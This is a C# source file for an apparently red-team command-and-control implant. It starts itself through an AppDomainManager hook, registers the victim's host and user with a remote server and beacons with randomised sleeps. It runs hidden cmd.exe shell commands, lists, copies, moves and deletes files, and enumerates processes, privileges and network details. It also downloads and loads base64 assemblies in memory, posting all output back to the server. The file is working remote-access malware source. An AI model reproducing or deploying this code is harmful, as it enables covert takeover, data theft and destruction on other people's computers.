using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
/*using System.Web.Script.Serialization;*/
using System.Management;

public sealed class MyAppDomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        bool res = ClassExample.Execute();

        return;
    }
}

public class ClassExample
{
    public static bool Execute()
    {
        Program.Main().GetAwaiter().GetResult();

        return true;
    }
}



public static class Primes
{
    public static void GenerateRandomPrimes(int count, int lowerLimit, int upperLimit)
    {


        Random random = new Random();
        int generatedCount = 0;

        while (generatedCount < count)
        {
            int number = random.Next(lowerLimit, upperLimit);

            if (IsPrime(number))
            {

                generatedCount++;
            }
        }
    }

    public static bool IsPrime(int number)
    {
        if (number <= 1)
            return false;

        if (number <= 3)
            return true;

        if (number % 2 == 0 || number % 3 == 0)
            return false;

        for (int i = 5; i * i <= number; i += 6)
        {
            if (number % i == 0 || number % (i + 2) == 0)
                return false;
        }

        return true;
    }



    public static class PrimeSleep
    {
        public static void Sleep(int sleepSeconds)
        {
            int milliseconds = sleepSeconds * 1000;
            Stopwatch stopwatch = new Stopwatch();
            int number = 100000;
            stopwatch.Start();

            while (stopwatch.ElapsedMilliseconds < milliseconds)
            {
                if (IsPrime(number))
                {

                    Thread.Sleep(milliseconds);
                }
                number++;
            }

            stopwatch.Stop();

        }

        private static bool IsPrime(int n)
        {
            if (n <= 1) return false;
            if (n <= 3) return true;

            if (n % 2 == 0 || n % 3 == 0) return false;

            for (int i = 5; i * i <= n; i += 6)
            {
                if (n % i == 0 || n % (i + 2) == 0) return false;
            }

            return true;
        }
    }
}




public class Program
{
    private static readonly HttpClient httpClient = new HttpClient();
    private static readonly Random random = new Random();

    // TODO Encrypt Config 1/2
    // string seed = <decryption key>
    // string cfg0 = <keyword URL> <Decrypted by Seed Key>
    // string cfgky = <obtained from last step>
    // string cfg1 = <base64 encrypted apiUrl>
    // string cfg2 = <base64 encrypted modUrl>
    private static string apiUrl = "https://.com/api";
    private static string modUrl = "https://.com/api/assets/";
    private static readonly string baseUrl = apiUrl;


    // TODO Encrypt Config 2/2
    // string hdr1 = <decrypted with cfgky>
    // string hdr2 = <decrypted with cfgky>
    static Program()
    {
        httpClient.DefaultRequestHeaders.Add("X-HOOK-TOKEN", "xhooktoken"); // TODO hdr1
        httpClient.DefaultRequestHeaders.Add("X-REGISTER-TOKEN", "xregistertoken"); // TODO hdr2
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
    }

    private static void PostData(string payload, string hook, string profile)
    {
        using (WebClient client = new WebClient())
        {
            client.Headers.Add("Content-Type", "application/json");
            client.Headers.Add("User-Agent", profile);
            client.UploadString(hook, "POST", payload);
        }
    }

    internal static string GenerateRandomString(int length)
    {
        Random random = new Random();
        string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        StringBuilder result = new StringBuilder();

        for (int i = 0; i < length; i++)
            result.Append(chars[random.Next(0, chars.Length)]);

        return result.ToString();
    }

    private static string RandomUserAgent()
    {
        string[] agents =
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
        };
        return agents[random.Next(0, agents.Length)];
    }

    private static string statusUrl = "https://_/api/status";
    private static async Task<string> CheckStatusAsync()
    {
        int failureCount = 0;
        string status = null;
        if (failureCount < 20)
        {
            try
            {
                status = await httpClient.GetStringAsync(statusUrl);
                status = status.Trim();



                if (!string.IsNullOrEmpty(status))
                {
                    failureCount = 0;
                    return status;
                }
            }
            catch (Exception ex)
            {
                failureCount++;
                if (failureCount == 4)
                {

                    return "kill";
                }
            }
        }


        return "unknown";


    }


    private static readonly string userAgent = RandomUserAgent();
    public static Dictionary<string, string> ParseArguments(string commandLine)
    {
        var argsPattern = @"-(\w+)\s*=\s*""([^""]*)""";  // Regex pattern adjusted for quoted values
        var matches = Regex.Matches(commandLine, argsPattern);

        return matches.Cast<Match>()
            .ToDictionary(m => m.Groups[1].Value, m => m.Groups[2].Value);
    }



    public static async Task Main()
    {

        int minSleepSeconds = 39;
        int maxSleepSeconds = 88;

        string host = Dns.GetHostName();
        string user = Environment.UserName;
        string id = $"{host}.{user}";



        try
        {

            try
            {
                await RegisterID(id);
            }
            catch (Exception ex)
            {

            }

            while (true)
            {

                SystemIdleChecker.UpdateIdleStatus();
                string statusMessage = SystemIdleChecker.GetCurrentStatusMessage();
                DateTime currentTimestamp = DateTime.Now;
                string updatedStatusMessage = $"{currentTimestamp.ToString("M/d/yyyy h:mm:ss tt")} - {statusMessage}";
                string resultsFile = $"{id}/results.txt";
                string checkinFile = $"{id}/checkin.txt";


                httpClient.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent", userAgent);
                string resultLabel = updatedStatusMessage;
                await WriteToFile(id, resultLabel);

                int sleepSeconds = random.Next(minSleepSeconds, maxSleepSeconds + 1);
                Primes.PrimeSleep.Sleep(sleepSeconds);


                string command = await CheckCommand(id);
                command = command.Trim();

                if (string.IsNullOrEmpty(command))
                {

                    continue;
                }
                if (command.StartsWith("shell", StringComparison.OrdinalIgnoreCase))
                {

                    string trimmedCommand = command.Trim();
                    if (trimmedCommand.StartsWith("shell", StringComparison.OrdinalIgnoreCase))
                    {


                        string result = OSCommands.OSCommand(trimmedCommand.Substring("shell".Length).Trim());
                        await WriteToFile(id, result);
                    }

                }
                else if (command.StartsWith("ls", StringComparison.OrdinalIgnoreCase))
                {

                    string lsResult = ListCurrentDirectory();
                    await WriteToFile(id, lsResult);
                }
                else if (command.StartsWith("cd", StringComparison.OrdinalIgnoreCase))
                {

                    string[] commandParts = command.Split(' ');
                    if (commandParts.Length == 2)
                    {
                        string path = commandParts[1];
                        try
                        {
                            Directory.SetCurrentDirectory(path);
                            string result = $"{resultLabel}\nCurrent directory changed to: {path}";
                            await WriteToFile(id, result);
                        }
                        catch (Exception ex)
                        {
                            string result = $"{resultLabel}\nError changing directory: {ex.Message}";
                            await WriteToFile(id, result);
                        }
                    }
                    else
                    {
                        string result = $"{resultLabel}\nInvalid cd command format. Usage: cd <path>";
                        await WriteToFile(id, result);
                    }
                }
                else if (command.StartsWith("exec", StringComparison.OrdinalIgnoreCase))
                {

                    string[] commandParts = command.Split(' ');
                    if (commandParts.Length == 2)
                    {
                        string assemblyPath = commandParts[1];
                        try
                        {
                            if (File.Exists(assemblyPath))
                            {
                                byte[] assemblyBytes = File.ReadAllBytes(assemblyPath);
                                string results = ExecuteAssembly(assemblyBytes, assemblyPath);

                                string result = $"{resultLabel}\n {assemblyPath}\nResults:\n{results}";
                                await WriteToFile(id, result);
                            }
                            else
                            {
                                string result = $"{resultLabel}\nFile does not exist: {assemblyPath}";
                                await WriteToFile(id, result);
                            }
                        }
                        catch (Exception ex)
                        {
                            string result = $"{resultLabel}\nError: {ex.Message}";
                            await WriteToFile(id, result);
                        }
                    }
                    else
                    {
                        string result = $"{resultLabel}\nInvalid format. ";
                        await WriteToFile(id, result);
                    }
                }
                else if (command.StartsWith("pwd", StringComparison.OrdinalIgnoreCase))
                {

                    string currentDirectory = Directory.GetCurrentDirectory();
                    string pwdResult = $"{resultLabel}\nCurrent directory: {currentDirectory}";
                    await WriteToFile(id, pwdResult);
                }
                else if (command.StartsWith("ps", StringComparison.OrdinalIgnoreCase))
                {

                    try
                    {
                        string psResult = listProcesses("");
                        await WriteToFile(id, psResult);
                    }
                    catch (Exception ex)
                    {
                        string psError = $"{resultLabel}\nError listing processes: {ex.Message}";
                        await WriteToFile(id, psError);
                    }
                }
                else if (command.StartsWith("cp", StringComparison.OrdinalIgnoreCase))
                {

                    string[] commandParts = command.Split(' ');
                    if (commandParts.Length == 3)
                    {
                        string sourcePath = commandParts[1];
                        string destinationPath = commandParts[2];

                        try
                        {
                            File.Copy(sourcePath, destinationPath);
                            string cpResult = $"{resultLabel}\nCopy successful";
                            await WriteToFile(id, cpResult);
                        }
                        catch (Exception ex)
                        {
                            string cpError = $"{resultLabel}\nError copying file or directory: {ex.Message}";
                            await WriteToFile(id, cpError);
                        }
                    }
                    else
                    {
                        string cpUsageError = $"{resultLabel}\nInvalid cp command format. Usage: cp <source> <destination>";
                        await WriteToFile(id, cpUsageError);
                    }
                }
                else if (command.StartsWith("delete", StringComparison.OrdinalIgnoreCase))
                {

                    string[] commandParts = command.Split(' ');
                    if (commandParts.Length == 2)
                    {
                        string path = commandParts[1];
                        try
                        {
                            if (File.Exists(path))
                            {
                                File.Delete(path);
                            }
                            else if (Directory.Exists(path))
                            {
                                Directory.Delete(path, true);
                            }
                            else
                            {
                                string deleteError = $"{resultLabel}\nFile or directory does not exist: {path}";
                                await WriteToFile(id, deleteError);
                                continue;
                            }

                            string deleteSuccess = $"{resultLabel}\n{path} deleted successfully";
                            await WriteToFile(id, deleteSuccess);
                        }
                        catch (Exception ex)
                        {
                            string deleteError = $"{resultLabel}\nError deleting file or directory: {ex.Message}";
                            await WriteToFile(id, deleteError);
                        }
                    }
                    else
                    {
                        string deleteUsageError = $"{resultLabel}\nInvalid delete command format. Usage: delete <path>";
                        await WriteToFile(id, deleteUsageError);
                    }
                }
 
                else if (command.StartsWith("whoami", StringComparison.OrdinalIgnoreCase))
                {

                    int maxRetries = 3;
                    int retryDelayMs = 1000;
                    bool success = false;

                    for (int retry = 0; retry < maxRetries; retry++)
                    {
                        try
                        {
                            string username = Environment.UserName;
                            /*bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);*/
                            WindowsIdentity currentIdentity = WindowsIdentity.GetCurrent();
                            WindowsPrincipal principal = new WindowsPrincipal(currentIdentity);
                            bool isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
                            string whoamiResult = $"{resultLabel}\nUsername: {username}\nIs Admin: {isAdmin}";
                            await WriteToFile(id, whoamiResult);

                            success = true;
                            break;
                        }
                        catch (Exception ex)
                        {
                            string whoamiError = $"{resultLabel}\nError getting user information: {ex.Message}";
                            await WriteToFile(id, whoamiError);

                            if (retry < maxRetries - 1)
                            {

                                await Task.Delay(retryDelayMs);
                            }
                        }
                    }

                    if (!success)
                    {
                        string finalError = $"{resultLabel}\nFailed to execute 'whoami' command after {maxRetries} retries.";
                        await WriteToFile(id, finalError);
                    }
                }
                else if (command.StartsWith("net", StringComparison.OrdinalIgnoreCase))
                {

                    string ipAddress = string.Empty;
                    string macAddress = string.Empty;
                    string publicIP = string.Empty;

                    try
                    {
                        ipAddress = GetIPAddress();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Error obtaining local IP Address: " + ex.Message);
                    }

                    try
                    {
                        if (!string.IsNullOrEmpty(ipAddress))
                        {
                            macAddress = GetMACAddress(ipAddress);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Error obtaining MAC Address: " + ex.Message);
                    }

                    try
                    {
                        publicIP = await GetPublicIPAddressAsync();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Error obtaining public IP Address: " + ex.Message);
                    }

                    // Collect network information
      /*              string networkInfo = NetworkInformationCollector.CollectNetworkInformation();*/

                    // Append network information to the result
                    string result = $"{resultLabel}\nIP Address: {ipAddress}\nMAC Address: {macAddress}\nPublic IP Address: {publicIP}s";

                    await WriteToFile(id, result);
                }

 

                else if (command.StartsWith("cloud", StringComparison.OrdinalIgnoreCase))
                {
                    try
                    {
                        string filePath = null;
                        string url = modUrl + "cloudish";
                        string mode = "RunCloudmode";
                        string module = "Cloudmode";
                        string pid = null;
                        string targetProcess = null;
                        string domain = null;
                        string username = null;
                        string password = null;
                        string commands = null;
                        string[] cmd = null;
                        string cmdString = null;

                        string result = I.Invoker.LoadAndExecute(filePath, url, mode, module, pid, targetProcess, domain, username, password, commands, cmd, cmdString);
                        await WriteToFile(id, result);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"An error occurred: {ex.Message}");
                    }
                }

 
                else if (command.StartsWith("mv", StringComparison.OrdinalIgnoreCase))
                {

                    string[] commandParts = command.Split(' ');
                    if (commandParts.Length == 3)
                    {
                        string sourcePath = commandParts[1];
                        string destinationPath = commandParts[2];

                        try
                        {
                            File.Move(sourcePath, destinationPath);
                            string mvResult = $"{resultLabel}\nMove successful";
                            await WriteToFile(id, mvResult);
                        }
                        catch (Exception ex)
                        {
                            string mvError = $"{resultLabel}\nError moving file or directory: {ex.Message}";
                            await WriteToFile(id, mvError);
                        }
                    }
                    else
                    {
                        string mvUsageError = $"{resultLabel}\nInvalid mv command format. Usage: mv <source> <destination>";
                        await WriteToFile(id, mvUsageError);
                    }
                }
            }
        }
        catch (Exception ex)
        {

        }
    }

    // New Modules

    

    public class RemoteConnections
    {
        public class RemoteConnectionData
        {
            public string LoggedOnUsers { get; set; }
            public string UserNetworkShares { get; set; }
            public string AllRemoteConnections { get; set; }
        }

        public static string GetUserNetworkShares()
        {
            var output = "User network shares...\n";

            // Query WMI for all network connections
            var query = new SelectQuery("SELECT * FROM Win32_NetworkConnection");
            var searcher = new ManagementObjectSearcher(query);

            foreach (ManagementObject mo in searcher.Get())
            {
                // Extract the username and sharename
                var username = mo["UserName"];
                var sharename = mo["RemoteName"];

                output += $"User: {username}, Share: {sharename}\n";
            }

            return output;
        }

        public static string GetRemoteConnections()
        {
            return GetLoggedOnUsers() + "\n" + GetUserNetworkShares();
        }

        public static string GetLoggedOnUsers()
        {
            var output = "Logged On users...\n";

            // Query WMI for all logged users
            var query = new SelectQuery("SELECT * FROM Win32_ComputerSystem");
            var searcher = new ManagementObjectSearcher(query);

            foreach (ManagementObject mo in searcher.Get())
            {
                // Extract the username
                var username = mo["UserName"];

                if (!string.IsNullOrEmpty(username as string))
                {
                    output += $"User: {username}\n";
                }
            }

            return output;
        }
    }


   



    
    public class OSCommands
    {
        public static string OSCommand(string cmdstr)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.RedirectStandardError = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine(cmdstr);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            String stdout = cmd.StandardOutput.ReadToEnd();
            String stderr = cmd.StandardError.ReadToEnd();
            cmd.WaitForExit();
            return stdout + stderr;
        }
    }

    private static String listProcesses(String filter)
    {
        var pl = new StringBuilder();
        Process[] myProcesses = Process.GetProcesses();
        pl.Append(" ---------------------------------------------------------------\r\n");
        pl.Append(String.Format(" {0, 8}  {1, -40} {2, -10}\r\n", "PID", "ProcessName", "Status"));
        pl.Append(" ---------------------------------------------------------------\r\n");
        foreach (Process p in myProcesses)
        {
            try
            {
                if (filter.Length > 0 && !p.ProcessName.ToLower().StartsWith(filter.ToLower()))
                    continue;
                pl.Append(String.Format(" {0, 8}  {1, -40} {2, -10}\r\n", p.Id,
                p.ProcessName, p.Responding ? "Running" : "IDLE"));
            }
            catch { continue; }
        }
        pl.Append(" ---------------------------------------------------------------\r\n");
        return pl.ToString();
    }



    private static async Task ExecuteCommand(string id, string command)
    {
        try
        {

            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };


            process.Start();
            process.StandardInput.WriteLine(command);
            process.StandardInput.WriteLine("exit");
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            await WriteToFile(id, output);
        }
        catch (Exception ex)
        {

        }
    }


    private static string ListCurrentDirectory()
    {
        try
        {
            string currentDirectory = Directory.GetCurrentDirectory();
            string[] files = Directory.GetFiles(currentDirectory);
            string[] directories = Directory.GetDirectories(currentDirectory);
            string fileList = "Files:" + Environment.NewLine + string.Join(Environment.NewLine, files);
            string directoryList = "Directories:" + Environment.NewLine + string.Join(Environment.NewLine, directories);

            return fileList + Environment.NewLine + directoryList;
        }
        catch (Exception ex)
        {
            return $"Error listing the current directory: {ex.Message}";
        }
    }


    private static string ExecuteAssembly(byte[] assemblyBytes, string assemblyPath)
    {

        try
        {
            Assembly assembly = Assembly.Load(assemblyBytes);
            MethodInfo entryPoint = assembly.EntryPoint;

            if (entryPoint != null)
            {
                object result = entryPoint.Invoke(null, null);
                return result?.ToString() ?? "Execution completed successfully.";
            }
            else
            {
                return "No entry point found in the assembly.";
            }
        }
        /*        catch (ReflectionTypeLoadException ex)
                {
                    foreach (var loaderException in ex.LoaderExceptions)
                    {
                        Console.WriteLine(loaderException.Message);
                        return $"Error executing the assembly '"+ loaderE;
                    }
                }*/
        catch (ReflectionTypeLoadException ex)
        {
            return $"Error executing the assembly '{assemblyPath}': {ex.Message}";
        }
    }

    private static string GetIPAddress()
    {
        var host = Dns.GetHostEntry(Dns.GetHostName());
        foreach (var ip in host.AddressList)
        {
            if (ip.AddressFamily == AddressFamily.InterNetwork)
            {
                return ip.ToString();
            }
        }
        throw new Exception("No network adapters with an IPv4 address in the system!");
    }

    public static async Task<string> GetPublicIPAddressAsync()
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                string ipAddress = await httpClient.GetStringAsync("https://icanhazip.com");
                return ipAddress.Trim();
            }
            catch (HttpRequestException e)
            {


                return null;
            }
        }
    }



    private static string GetMACAddress(string ipAddress)
    {

        var query = NetworkInterface.GetAllNetworkInterfaces()
            .Where(n =>
                n.OperationalStatus == OperationalStatus.Up &&
                n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
            .Select(_ => new
            {
                PhysicalAddress = _.GetPhysicalAddress(),
                IPProperties = _.GetIPProperties(),
            });

        var mac = query
            .Where(q => q.IPProperties.UnicastAddresses
                .Any(ua => ua.Address.ToString() == ipAddress))
            .FirstOrDefault()
            .PhysicalAddress;


        return String.Join("-", mac.GetAddressBytes().Select(b => b.ToString("X2")));
    }
    private static async Task WriteToFile(string id, string content)
    {
        try
        {

            var requestContent = new StringContent(content);
            string url = baseUrl + $"/2.0/write/{id}/results";
            HttpResponseMessage response = await httpClient.PostAsync(url, requestContent);
            response.EnsureSuccessStatusCode();

        }
        catch (Exception ex)
        {

        }
    }

    private static async Task WriteToModule(string id, string url, string content)
    {
        try
        {
            // Create HTTP content from the string content
            var requestContent = new StringContent(content, Encoding.UTF8, "application/json");

            // Send a POST request to the specified URL
            HttpResponseMessage response = await httpClient.PostAsync(url, requestContent);
            response.EnsureSuccessStatusCode();  // Throws an exception if the HTTP response status is an error status
        }
        catch (Exception ex)
        {
            // Log the exception or handle it as needed
            Console.WriteLine($"Error posting data: {ex.Message}");
        }
    }
    private static async Task ExecuteCommandWithRetries(string id, string command, int maxRetries = 3)
    {
        int retryCount = 0;
        while (retryCount < maxRetries)
        {
            try
            {
                await ExecuteCommand(id, command);

                break;
            }
            catch (Exception ex)
            {

                retryCount++;
                if (retryCount < maxRetries)
                {
                    int retryDelayInSeconds = 5;
                    await Task.Delay(retryDelayInSeconds * 1000);
                }
            }
        }
    }

    private static async Task<string> RegisterID(string id)
    {
        string url = baseUrl + $"/2.0/registration/{id}";

        try
        {


            var content = new StringContent("", Encoding.UTF8, "application/json");
            HttpResponseMessage response = await httpClient.PostAsync(url, content);
            response.EnsureSuccessStatusCode();
            string resultContent = await response.Content.ReadAsStringAsync();
            Console.WriteLine("Result of RegisterCommand: " + resultContent);

            return resultContent;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
            return null;
        }

    }

    private static async Task<string> CheckCommand(string id)
    {
        string url = baseUrl + $"/2.0/task/{id}/checkin";

        try
        {
            HttpResponseMessage response = await httpClient.GetAsync(url);
            string responseContent = await response.Content.ReadAsStringAsync();
            return responseContent;
        }
        catch (HttpRequestException ex)
        {
            return null;
        }
    }
    private static async Task PostResults(string id, string content)
    {
        try
        {
            string url = baseUrl + $"write/{id}/results";
            var requestContent = new StringContent(content);

            HttpResponseMessage response = await httpClient.PostAsync(url, requestContent);
            response.EnsureSuccessStatusCode();

        }
        catch (Exception ex)
        {

        }
    }

    private static async Task<string> AgentFolderUpload(string id, string filename, string fileContent)
    {



        string route = $"/2.0/agentupload/{id}/{filename}";


        string agentUploadUrl = baseUrl + route;

        try
        {

            var request = new HttpRequestMessage(HttpMethod.Post, agentUploadUrl);


            request.Headers.Add("X-HOOK-TOKEN", "straylightsecurity");


            request.Content = new StringContent(fileContent, Encoding.UTF8, "application/json");


            HttpResponseMessage response = await httpClient.SendAsync(request);


            if (response.IsSuccessStatusCode)
            {
                string result = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"File uploaded successfully to {agentUploadUrl}");
                return result;
            }
            else
            {
                Console.WriteLine($"File upload failed. Status code: {response.StatusCode}");
                return null;
            }
        }
        catch (HttpRequestException ex)
        {
            Console.WriteLine($"Error in AgentFolderUpload: {ex.Message}");
            return null;
        }
    }


    private static async Task<string> GetCommand(string id)
    {

        string url = baseUrl + $"/2.0/task/{id}/checkin.txt";

        try
        {
            HttpResponseMessage response = await httpClient.GetAsync(url);
            response.EnsureSuccessStatusCode();
            string command = await response.Content.ReadAsStringAsync();
            Console.WriteLine("Result of GetCommand: " + response);

            return command;
        }
        catch (HttpRequestException ex)
        {

            return null;
        }
    }
}


public class SystemIdleChecker
{
    [StructLayout(LayoutKind.Sequential)]
    private struct LASTINPUTINFO
    {
        public uint cbSize;
        public uint dwTime;
    }

    [DllImport("user32.dll")]
    private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    private static DateTime lastIdleCheck = DateTime.Now;
    private static TimeSpan idleThreshold = TimeSpan.FromMinutes(5);
    private static bool isIdle;
    private static DateTime? idleSince;
    private static DateTime? activeSince = DateTime.Now;

    public static bool IsIdle
    {
        get { return isIdle; }
        private set
        {
            if (isIdle != value)
            {
                isIdle = value;
                if (isIdle)
                {
                    idleSince = DateTime.Now;
                    activeSince = null;
                }
                else
                {
                    activeSince = DateTime.Now;
                    idleSince = null;
                }
            }
        }
    }

    public static bool IsActive => !IsIdle;

    public static DateTime? IdleSince => idleSince;

    public static DateTime? ActiveSince => activeSince;

    public static string GetCurrentStatusMessage()
    {
        if (IsIdle && IdleSince.HasValue)
        {
            return $"System has been idle since: {IdleSince.Value}";
        }
        else if (!IsIdle && ActiveSince.HasValue)
        {
            return $"System has been active since: {ActiveSince.Value}";
        }
        else
        {

            return "Unable to determine system status.";
        }
    }
    public static void UpdateIdleStatus()
    {
        TimeSpan timeSinceLastInput = GetTimeSinceLastInput();
        IsIdle = timeSinceLastInput > idleThreshold;
        lastIdleCheck = DateTime.Now;
    }

    public static string GetIdleStatusMessage()
    {
        if (IsIdle && IdleSince.HasValue)
        {
            return $"System has been idle since: {IdleSince.Value}";
        }
        return "System is currently active.";
    }

    public static string GetActiveStatusMessage()
    {
        if (!IsIdle && ActiveSince.HasValue)
        {
            return $"System has been active since: {ActiveSince.Value}";
        }
        return "System is currently idle.";
    }


    private static TimeSpan GetTimeSinceLastInput()
    {
        LASTINPUTINFO lastInputInfo = new LASTINPUTINFO
        {
            cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO))
        };
        GetLastInputInfo(ref lastInputInfo);

        uint lastInputTick = lastInputInfo.dwTime;
        uint currentTick = (uint)Environment.TickCount;

        return TimeSpan.FromMilliseconds(currentTick - lastInputTick);
    }
}


namespace I
{
    public static class Invoker
    {
        static Dictionary<string, string> ParseArguments(string[] args)
        {
            var argDictionary = new Dictionary<string, string>();
            foreach (var arg in args)
            {
                var splitArg = arg.Split(new[] { '=' }, 2);
                if (splitArg.Length == 2)
                {
                    argDictionary[splitArg[0].TrimStart('-')] = splitArg[1];
                }
            }
            return argDictionary;
        }

        public static void Mainly(string[] args)
        {
            var arguments = ParseArguments(args);
            arguments.TryGetValue("filePath", out var filePath);
            arguments.TryGetValue("url", out var url);
            arguments.TryGetValue("mode", out var mode);
            arguments.TryGetValue("module", out var module);
            arguments.TryGetValue("pid", out var pid);
            arguments.TryGetValue("targetProcess", out var targetProcess);
            arguments.TryGetValue("domain", out var domain);
            arguments.TryGetValue("username", out var username);
            arguments.TryGetValue("password", out var password);
            arguments.TryGetValue("commands", out var commands);
            arguments.TryGetValue("cmd", out var cmdString);

            if ((string.IsNullOrEmpty(filePath) && string.IsNullOrEmpty(url)) || string.IsNullOrEmpty(mode) || string.IsNullOrEmpty(module))
            {
                Console.WriteLine("Required parameters: -filePath or -url, -mode, and -module are mandatory, big dawg.");
                return;
            }


            string[] cmd = !string.IsNullOrEmpty(cmdString) ? cmdString.Split() : null;


            LoadAndExecute(filePath, url, mode, module, pid, targetProcess, domain, username, password, commands, cmd, cmdString);
        }

        public static string LoadAndExecute(string filePath, string url, string mode, string module, string pid, string targetProcess, string domain, string username, string password, string commands, string[] cmd, string cmdString)
        {

            Assembly assembly;
            StringBuilder capturedOutput = new StringBuilder();



            if (!string.IsNullOrEmpty(url))
            {
                // Use WebClient or HttpClient to download the assembly as a base64 string
                using (var client = new WebClient())
                {
                    client.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4";
                    string base64EncodedAssembly = client.DownloadString(url);

                    // Decode the base64 string to byte array
                    byte[] assemblyData = Convert.FromBase64String(base64EncodedAssembly);

                    // Load the assembly from byte array
                    assembly = Assembly.Load(assemblyData);
                }
            }
            else if (!string.IsNullOrEmpty(filePath))
            {
                // Load the assembly from file path
                assembly = Assembly.LoadFrom(filePath);
            }
            else
            {
                throw new ArgumentException("Either a file path or a URL must be provided.");
            }
            /*var assembly = Assembly.LoadFrom(filePath);*/

            // List all types in the loaded assembly
            Console.WriteLine("Listing all types in the loaded assembly:");
            Type[] types = assembly.GetTypes();
            foreach (Type type2 in types)
            {
                Console.WriteLine(type2.FullName);
            }

            var type = assembly.GetType($"{module}.Modes.{mode}", true, true);
            var method = type.GetMethod("Execute");
            var instance = Activator.CreateInstance(type);
            if (instance == null)
            {
                throw new InvalidOperationException("Instance could not be created. Check constructor requirements.");
            }


            // Check the method parameters and pass only those needed
            ParameterInfo[] parameters = method.GetParameters();
            List<object> passedParameters = new List<object>();
            foreach (var param in parameters)
            {
                switch (param.Name)
                {
                    case "domain":
                        passedParameters.Add(domain);
                        break;
                    case "username":
                        passedParameters.Add(username);
                        break;
                    case "password":
                        passedParameters.Add(password);
                        break;
                    case "commands":
                        passedParameters.Add(commands);
                        break;
                    case "cmd":
                        passedParameters.Add(cmd);
                        break;
                    case "pid":
                        passedParameters.Add(pid);
                        break;
                    case "targetProcess":
                        passedParameters.Add(targetProcess);
                        break;
                    case "cmdString":
                        passedParameters.Add(cmdString);
                        break;
                    default:
                        Console.WriteLine($"Skipping unexpected parameter: {param.Name}");
                        break;
                }
            }

            // Original Way
            /*  method.Invoke(instance, passedParameters.ToArray());*/

            // Capture Output to Post 
            using (StringWriter stringWriter = new StringWriter(capturedOutput))
            {
                Console.SetOut(stringWriter);

                method.Invoke(instance, passedParameters.ToArray());

                // Resetting the output to standard output
                Console.SetOut(new StreamWriter(Console.OpenStandardOutput()) { AutoFlush = true });
            }

            // New Parse Args for modules

            return capturedOutput.ToString();
        }
    }
}



/*    namespace Sadmode.Modes
    {*/
// Wrappers for method calls to simplify the loader so  -mode="GetSystem" or "CheckAndElevate" must contain 'Execute'
/*        public class Sadmode
        {
            public void Execute()
            {
                Program.Main();
            }
        }
    }*/


